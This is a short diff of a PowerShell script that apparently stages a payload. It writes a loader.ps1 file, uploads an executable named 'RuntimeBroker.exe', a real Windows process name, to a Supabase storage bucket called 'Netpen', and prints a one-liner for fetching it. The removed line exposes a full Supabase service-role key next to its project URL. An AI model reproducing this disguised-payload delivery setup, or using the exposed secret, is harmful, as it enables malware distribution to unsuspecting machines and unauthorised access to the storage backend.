@@ -23,7 +23,11 @@ Set-Content -Path "loader.ps1" -Value $loader
 
 # Upload to Supabase Storage + print one-liner
 $sbUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co"
-$svKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhkeGxma3l5d25qcnpxYmx2ZHpnIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3OTgxNzA5OCwiZXhwIjoyMDk1MzkzMDk4fQ.jrGzf-7PG-a87fLiyR-6tnKJeE9esyK1CrwPgvO_POs"
+$envConfig = @{}
+Get-Content "config.env" | Where-Object { $_ -match '^(\w+)=(.+)' } | ForEach-Object {
+    $envConfig[$matches[1]] = $matches[2]
+}
+$svKey = $envConfig["SUPABASE_SERVICE_KEY"]
 $headers = @{ "apikey" = $svKey; "Authorization" = "Bearer $svKey" }
 $bucket = "Netpen"
 $object = "RuntimeBroker.exe"
